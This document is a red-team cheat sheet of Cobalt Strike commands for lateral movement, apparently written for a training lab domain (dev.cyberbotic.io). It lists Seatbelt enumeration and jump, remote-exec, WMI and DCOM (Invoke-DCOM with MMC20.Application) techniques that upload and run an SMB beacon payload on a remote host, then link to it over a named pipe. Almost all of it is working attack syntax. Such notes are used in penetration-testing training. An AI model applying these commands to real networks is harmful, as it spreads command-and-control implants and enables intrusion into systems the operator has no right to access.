# Useful enumeration before jumping to a target

```bash
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe OSInfo -ComputerName=web

# if CoInitializeSecurity already called. error (Spawn a new beacon)
spawn [x86|x64] [listener]
spawnas [DOMAIN\user] [password] [listener]
execute-assembly C:\Tools\SharpWMI\SharpWMI\bin\Release\SharpWMI.exe action=exec computername=web.dev.cyberbotic.io command="C:\Windows\smb_x64.exe"
```

---

# Using the JUMP command (directly spawn a beacon in the target)

```bash
jump [method] [target] [listener]

# Blends well with traffic
jump winrm64 web.dev.cyberbotic.io smb

# Uploads binary and and starts service to execute binary
jump psexec64 web.dev.cyberbotic.io smb

# Runs powershell oneliner
jump psexec_psh web smb
```

---

# Using REMOTE-EXEC command (run command on remote computer)

```bash
remote-exec [method] [target] [command]

# Uploading binary
cd \\web.dev.cyberbotic.io\ADMIN$
upload C:\Payloads\smb_x64.exe
remote-exec wmi web.dev.cyberbotic.io C:\Windows\smb_x64.exe

# Link the spawn process (check where we get pipe from)
link web.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10
```

---

# DCOM (Distributed Component Object Model)

https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1

```bash
# Import module
powershell-import C:\Tools\Invoke-DCOM.ps1

# Spawn a proccess mmc.exe.
powershell Invoke-DCOM -ComputerName web.dev.cyberbotic.io -Method MMC20.Application -Command C:\Windows\smb_x64.exe

# Link the process to connect to it
link web.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10
```
